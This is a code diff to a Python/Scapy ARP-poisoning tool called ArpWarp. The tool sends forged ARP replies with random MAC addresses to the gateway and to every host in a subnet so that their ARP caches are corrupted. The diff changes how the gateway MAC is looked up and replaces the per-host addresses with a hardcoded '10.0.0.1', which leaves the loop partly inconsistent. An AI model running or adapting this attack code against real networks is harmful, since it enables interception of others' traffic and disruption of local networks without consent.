@@ -39,21 +39,22 @@ class ArpWarp:
         print(f"[*] Setting up attacker...")
 
         self.network_interface = iface
+        conf.iface = iface  # TODO above also not needed?
         self.cidr = cidr
 
         self.my_mac = Ether().src
         self.my_private_ip = get_if_addr(self.network_interface)
-
         self.arp_poison_interval = s_time
 
         self.subnet = self.my_private_ip.split(".")[:3]
         self.gateway_ip = gateway or f"{'.'.join(self.subnet)}.1"
-        self.gateway_mac = self.get_mac(self.gateway_ip)
+        self.gateway_mac = getmacbyip(self.gateway_ip)
+
         if not self.gateway_mac:
             raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")
 
-        self.host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                         host_ip != self.my_private_ip and host_ip != self.gateway_ip}  # TODO where are the rest
+        self.host_ips = [host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
+                         host_ip != self.my_private_ip and host_ip != self.gateway_ip]  # TODO where are the rest
         print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
 
         self.abort = False
@@ -65,13 +66,12 @@ class ArpWarp:
         """
         for host_ip in self.host_ips:
             # poison gateways's arp cache
-            print(self.gateway_ip)
-            arp_packet_gateway = ARP(op=2, psrc=str(host_ip), hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
+            arp_packet_gateway = ARP(op=2, psrc="10.0.0.1", hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
             print(host_ip)
             sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
             # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=str(host_ip))
-            sendp(Ether(dst='ff:ff:ff:ff:ff') / arp_packet_host, iface=self.network_interface)
+            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst="10.0.0.1")
+            sendp(Ether() / arp_packet_host, iface=self.network_interface)
 
     def start_attack(self):
         loop_count = 0
@@ -88,14 +88,6 @@ class ArpWarp:
                 print(f"[*] User requested to stop...")
                 self.abort = True
         print("[*] Restoring arp...")
-
-    @staticmethod
-    def get_mac(ip_address):
-        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
-                                    timeout=ArpWarp._P_TIMEOUT, retry=ArpWarp._P_RETRY)
-        for s, r in responses:
-            return r[Ether].src
-        return None
 
 
 if __name__ == "__main__":
